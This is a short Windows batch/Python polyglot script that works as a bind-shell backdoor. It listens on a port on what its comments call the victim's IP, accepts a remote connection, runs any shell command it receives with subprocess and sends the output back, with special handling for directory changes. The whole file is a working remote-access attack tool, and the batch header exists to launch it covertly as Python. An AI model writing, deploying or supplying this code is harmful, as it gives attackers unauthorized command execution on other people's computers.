@setlocal enabledelayedexpansion && python -x "%~f0"  & exit /b 
import socket
import subprocess
import os

with socket.socket() as soc:
      soc.bind(("XXX.XXX.XXX.XXX", 1234)) #you have to know the victim IP
      soc.listen()
      client, address = soc.accept() #wait for connection
      command = ""
      while command != "q":
            command = client.recv(256).decode() #get command from client 
            if command[:2]=="cd" and len(command)>2: #if command was 'cd xxxx' use os.chdir(path)
                  os.chdir(command[3:]) #change dir
                  client.send(os.getcwd().encode()) #return new dir path
                  continue # no sub process this time

            
            process = subprocess.run(command, shell=True ,stdout=subprocess.PIPE, stderr=subprocess.PIPE) #run command on shell
            client.send(process.stdout) #send stdout to server
                  

                        







      
